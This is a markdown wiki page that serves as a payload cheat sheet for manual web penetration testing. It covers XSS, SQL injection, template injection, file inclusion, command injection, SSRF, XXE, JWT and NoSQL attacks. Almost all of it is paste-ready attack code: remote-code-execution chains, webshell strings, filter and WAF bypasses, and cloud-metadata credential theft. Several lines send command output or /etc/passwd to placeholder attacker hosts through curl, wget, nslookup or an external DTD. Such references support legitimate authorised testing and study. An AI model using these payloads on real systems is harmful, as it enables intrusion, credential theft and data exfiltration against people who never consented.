---
type: wiki
category: attack
tool: payloads
status: active
last-updated: 2026-04-21
---

# Payload Quick Reference (XSS / SQLi / SSTI / LFI / CmdInj)

> **Purpose:** A pocket reference of payloads for manual testing. Organized by framework / DB / scenario to cut down on trial-and-error.
> Every payload can be pasted into Burp Repeater / Caido Replay / curl / sqlmap --tamper.

## XSS

### General-purpose polyglot (a single payload that hits the most contexts)

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Polyglot 2 (Gareth Heyes):

```
"><img src=x onerror=alert(1)>
```

Polyglot 3 (OOXMN):

```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

### Context-based

| Context | Payload |
|---------|---------|
| HTML body | `<img src=x onerror=alert(1)>` |
| HTML body (no `<`) | `&#60;img src=x onerror=alert(1)&#62;` |
| Attribute (no quote) | ` onmouseover=alert(1) a=` |
| Attribute (double quote) | `" onmouseover=alert(1) x="` |
| Attribute (href/src) | `javascript:alert(1)` |
| JS string (double quote) | `";alert(1);//` |
| JS string (single quote) | `';alert(1);//` |
| JS template literal | `${alert(1)}` |
| CSS | `</style><img src=x onerror=alert(1)>` |
| Filter: `<script` blocked | `<svg onload=alert(1)>` / `<details open ontoggle=alert(1)>` |
| Filter: `on*` blocked | `<svg><animate onbegin=alert(1) attributeName=x dur=1s>` |
| Filter: `alert` blocked | `[].constructor.constructor('alert(1)')()` |
| Filter: `()` blocked | `` alert`1` `` |
| Filter: `' " <` all encoded | `javascript:alert(1)` in href / form action |

### DOM XSS

```js
// Common sinks
location.hash / location.search / location.href
document.write / document.writeln
innerHTML / outerHTML
eval / setTimeout / setInterval / Function
jQuery.html / jQuery.append
postMessage (onmessage handler)

// Source
https://target.com/#<img src=x onerror=alert(1)>
https://target.com/?q=<img src=x onerror=alert(1)>
```

### CSP bypass (common)

```html
<!-- Bypassing script-src 'self' -->
<!-- if a same-origin JSONP endpoint exists -->
<script src="https://target.com/api/jsonp?callback=alert(1)//"></script>

<!-- if AngularJS 1.x is present -->
<div ng-app ng-csp id=p ng-click=$event.view.alert(1)>

<!-- unrestricted base URI -->
<base href="https://evil.com/"><script src="x.js"></script>
```

## SQL Injection

### Identifying the DB type (without sqlmap)

```sql
-- MySQL/MariaDB
' AND 1=1 AND @@version LIKE '5%' --
' AND SLEEP(5) --
' UNION SELECT @@version --

-- MSSQL
' AND 1=(SELECT @@version) --
' WAITFOR DELAY '0:0:5' --

-- PostgreSQL
' AND 1=(SELECT version()) --
' AND pg_sleep(5) --

-- Oracle
' AND 1=(SELECT banner FROM v$version WHERE ROWNUM=1) --
' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1 --

-- SQLite
' AND 1=(SELECT sqlite_version()) --

-- Generic confirmation
' OR 1=1 --
' OR '1'='1
') OR 1=1 --
```

### UNION-based

```sql
-- 1. Find the column count
' ORDER BY 1 --
' ORDER BY 10 --
' ORDER BY 5 -- ← if this doesn't error, there are 5 columns

-- 2. Find the reflected position
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT 'a','b','c','d','e' --

-- 3. Extract data
' UNION SELECT 1,user(),database(),version(),5 --
' UNION SELECT 1,table_name,NULL,NULL,NULL FROM information_schema.tables --
' UNION SELECT 1,GROUP_CONCAT(column_name SEPARATOR ','),NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
```

### Blind boolean

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
' AND (SELECT COUNT(*) FROM users)>0 --
' AND (SELECT IF(1=1,SLEEP(5),0)) --  -- time-based fallback
```

### Error-based (MySQL)

```sql
' AND extractvalue(1,concat(0x7e,(SELECT version()))) --
' AND updatexml(1,concat(0x7e,(SELECT user())),1) --
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
```

### WAF bypass combos

See [14-waf-bypass-commands.md](14-waf-bypass-commands.md) § sqlmap tamper.

Manual:

```sql
-- Whitespace substitution
/**/  /*!*/  %09(tab)  %0a(LF)  +
-- UNION SELECT → UNI/**/ON SELECT
-- SLEEP(5) → /*!SLEEP*/(5)

-- Splitting keywords (MySQL)
UN/**/ION/**/SE/**/LECT
UnIoN SeLeCt

-- Encoding
%252f%252a (double URL encode)
CHAR(72,69,76,76,79) → "HELLO"
0x48454c4c4f → "HELLO"
```

## SSTI (Server-Side Template Injection)

### Detection (generic)

```
{{7*7}}       → 49 (Jinja2/Twig/Nunjucks)
${7*7}        → 49 (Freemarker/Velocity/Mako)
<%= 7*7 %>    → 49 (ERB/JSP)
#{7*7}        → 49 (Pug/Ruby)
{7*7}         → 49 (some older engines)

# Distinguishing Jinja2 vs Twig
{{7*'7'}}
  → 7777777 = Jinja2
  → 49 = Twig
```

### Jinja2 (Python)

```python
# Version
{{config}}
{{ self.__dict__ }}

# RCE via class chain
{{ ''.__class__.__mro__[1].__subclasses__() }}  # list classes
{{ ''.__class__.__mro__[1].__subclasses__()[XXX]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[XXX].__init__.__globals__['os'].popen('id').read() }}

# Commonly used
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}  // Twig >= 1.19
{{['cat /etc/passwd']|filter('system')}}
```

### Freemarker (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}
```

### Velocity (Java)

```
#set($x = "")##
#set($rt = $x.class.forName("java.lang.Runtime"))##
#set($chr = $x.class.forName("java.lang.Character"))##
#set($str = $x.class.forName("java.lang.String"))##
#set($ex = $rt.getRuntime().exec("id"))##
$ex.waitFor()
#set($out = $ex.getInputStream())
```

### ERB (Ruby)

```ruby
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
```

### Smarty (PHP)

```
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### tplmap (automated)

```bash
pip install tplmap
tplmap -u "https://target.com/page?name=FUZZ"
tplmap -u "https://target.com/page" -d "name=FUZZ"
```

## LFI / Path Traversal

### General

```
# Basic
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f  (double encode)

# Null byte (old PHP)
../../../etc/passwd%00
../../../etc/passwd%00.png

# Filter bypass
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..\/..\/..\/etc\/passwd

# UTF-8 overlong
%c0%ae%c0%ae/  (= ..)
```

### Common reads on Linux

```
/etc/passwd
/etc/shadow             # needs root
/etc/hosts
/etc/issue
/proc/self/environ      # contains env vars (often secrets)
/proc/self/cmdline
/proc/self/status
/proc/self/fd/0..       # open file descriptors
/proc/net/tcp           # internal connections
/root/.bash_history
/root/.ssh/id_rsa
/home/<user>/.bash_history
/home/<user>/.ssh/id_rsa
/var/log/apache2/access.log  # log poisoning
/var/log/auth.log
/var/log/nginx/access.log
/var/www/html/config.php
```

### Windows

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Windows\System32\inetsrv\MetaBase.xml
C:\inetpub\wwwroot\web.config
C:\xampp\apache\logs\access.log
..\..\..\Windows\System32\drivers\etc\hosts
```

### PHP wrapper (RCE chain)

```
php://filter/convert.base64-encode/resource=index.php   → base64 source code
php://filter/read=convert.base64-encode/resource=../config.php
php://input  + POST body = <?php system($_GET[c]); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
expect://id
zip:///tmp/evil.zip%23shell
```

### Log poisoning

```
1. User-Agent: <?php system($_GET['c']); ?>
2. LFI include /var/log/apache2/access.log?c=id
   → executes
```

## Command Injection

### Basic

```bash
# General
; id
| id
& id
&& id
|| id
`id`
$(id)

# Windows
& whoami
&& whoami
| whoami
```

### Filter bypass

```bash
# Whitespace
{id,}
$IFS$9id
{cat,/etc/passwd}
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd' && $X

# Splitting keywords
c''a''t /etc/passwd
c\a\t /etc/passwd
/bin/c?t /etc/passwd
/???/c?t /etc/??sswd
cat `echo -e "/etc/pa\x73swd"`

# Blind (no output channel)
`curl http://attacker/$(id)`
`nslookup $(whoami).attacker.com`
`ping -c 1 $(id|xxd -p).attacker.com`
```

### Out-of-band (OAST)

```bash
# Burp Collaborator / Interactsh
interactsh-client

# Payload
`curl $(id | base64).xxx.oast.pro`
`nslookup $(whoami).xxx.oast.pro`
`wget https://xxx.oast.pro/$(cat /etc/passwd | base64 -w0)`
```

## SSRF

### Basic probing

```
http://127.0.0.1:80/
http://localhost/
http://0.0.0.0/
http://0/
http://[::1]/

# IP encoding
http://2130706433/           # 127.0.0.1 as int
http://0x7f000001/           # hex
http://0177.0.0.1/           # octal

# DNS rebinding
http://attacker-controlled-dns/   # TTL=0, alternates 127.0.0.1/attacker

# Bypassing a "127.0.0.1" blocklist
http://127.1/
http://127.0.1/
```

### Cloud metadata (highest-value payouts)

```bash
# AWS
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data

# AWS IMDSv2 (requires a token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure
curl -H "Metadata:true" http://169.254.169.254/metadata/instance?api-version=2021-02-01

# DigitalOcean
curl http://169.254.169.254/metadata/v1/
```

### Other internal services

```
http://127.0.0.1:6379/   Redis
http://127.0.0.1:5984/   CouchDB
http://127.0.0.1:27017/  MongoDB
http://127.0.0.1:9200/   Elasticsearch
http://127.0.0.1:8500/   Consul
http://127.0.0.1:2375/   Docker API
http://127.0.0.1:10250/  Kubelet
http://127.0.0.1:8080/   Jenkins / general dev server
```

### Protocol smuggling

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
gopher://127.0.0.1:25/_MAIL%20FROM:...  (SMTP smuggling)
file:///etc/passwd
dict://127.0.0.1:11211/stat
```

## XXE

```xml
<!-- External entity -->
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>

<!-- SSRF chain -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://attacker/"> ]>

<!-- Blind OOB -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker/xxe.dtd">
  %xxe;
]>

<!-- External xxe.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?x=%file;'>">
%eval;
%exfil;

<!-- PHP wrapper -->
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```

## JWT

See [16-oauth-attack-chains.md](16-oauth-attack-chains.md) § 10-11.

```bash
# Quick alg=none
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'
echo -n '{"sub":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '/+' '_-'
# JWT = header.payload.  (empty signature)

# Weak secret brute-force
hashcat -m 16500 jwt.txt rockyou.txt
```

## NoSQL Injection

### MongoDB

```js
// login bypass
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$regex":".*"},"password":{"$regex":".*"}}
{"username":"admin","password":{"$gt":""}}

// URL form
username[$ne]=null&password[$ne]=null

// RCE (old versions)
{"$where":"function(){sleep(5000); return true;}"}
```

## Related files

- [14-waf-bypass-commands.md](14-waf-bypass-commands.md) — payload encoding + WAF bypass
- [15-nuclei-attack-templates.md](15-nuclei-attack-templates.md) — automation counterpart
- [16-oauth-attack-chains.md](16-oauth-attack-chains.md)
- [17-graphql-deep-attacks.md](17-graphql-deep-attacks.md)
- [29-tool-sqlmap.md](29-tool-sqlmap.md)
- [25-tool-dalfox.md](25-tool-dalfox.md)

## External payload collections

- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- SecLists: https://github.com/danielmiessler/SecLists
- HackTricks: https://book.hacktricks.wiki
- OWASP Cheatsheet Series: https://cheatsheetseries.owasp.org
